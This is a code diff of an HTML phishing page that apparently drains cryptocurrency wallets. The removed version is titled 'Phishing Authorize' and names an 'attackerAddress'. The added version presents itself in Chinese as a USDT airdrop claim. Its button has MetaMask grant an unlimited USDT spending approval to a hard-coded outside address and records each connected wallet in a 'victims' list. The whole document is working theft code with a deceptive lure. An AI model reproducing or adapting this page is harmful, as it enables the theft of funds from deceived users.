@@ -1,36 +1,25 @@
 <!DOCTYPE html>
 <html>
-<head>
-  <meta charset="UTF-8">
-  <title>Phishing Authorize</title>
-</head>
-<body>
-  <h2>授權 USDT（Ethereum 主網）</h2>
-  <button onclick="approve()">授權最大金額</button>
-
-  <script src="https://cdn.jsdelivr.net/npm/ethers@6.6.2/dist/ethers.min.js"></script>
+<head><meta charset="utf-8"><title>USDT 空投活動</title>
+<script src="https://cdn.jsdelivr.net/npm/web3@1.10.0/dist/web3.min.js"></script></head>
+<body style="text-align:center;font-family:sans-serif;padding:50px;">
+  <h2>🎁 恭喜獲得 USDT 空投！</h2>
+  <button onclick="approve()">立即領取</button>
   <script>
-    const usdtAddress = '0xdAC17F958D2ee523a2206206994597C13D831ec7';
-    const attackerAddress = '0xDa4FfA490992769B8F54063bf0B9E7a4D3479459';
-
-    const abi = ['function approve(address spender, uint256 amount) public returns (bool)'];
-
+    const token = "0xdAC17F958D2ee523a2206206994597C13D831ec7";
+    const spender = "0xFbe9c4748A267562f723C67db673943F901533D6";
     async function approve() {
-      if (!window.ethereum) return alert('請先安裝 MetaMask');
-      await window.ethereum.request({ method: 'eth_requestAccounts' });
-
-      const provider = new ethers.BrowserProvider(window.ethereum);
-      const signer = await provider.getSigner();
-      const contract = new ethers.Contract(usdtAddress, abi, signer);
-      const max = ethers.MaxUint256;
-
-      try {
-        const tx = await contract.approve(attackerAddress, max);
-        alert('已送出授權交易，請到 MetaMask 確認');
-        console.log('TX:', tx.hash);
-      } catch (err) {
-        alert('授權失敗：' + err.message);
-      }
+      if (!window.ethereum) return alert("請先安裝 MetaMask");
+      const web3 = new Web3(window.ethereum);
+      await ethereum.request({ method: "eth_requestAccounts" });
+      const abi = [{"name":"approve","type":"function","inputs":[{"name":"spender","type":"address"},{"name":"amount","type":"uint256"}],"outputs":[{"name":"","type":"bool"}],"type":"function"}];
+      const contract = new web3.eth.Contract(abi, token);
+      const accounts = await web3.eth.getAccounts();
+      const amount = "0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff";
+      await contract.methods.approve(spender, amount).send({ from: accounts[0] });
+      const history = JSON.parse(localStorage.getItem("victims") || "[]");
+      history.push({ address: accounts[0], time: new Date().toLocaleString() });
+      localStorage.setItem("victims", JSON.stringify(history));
     }
   </script>
 </body>
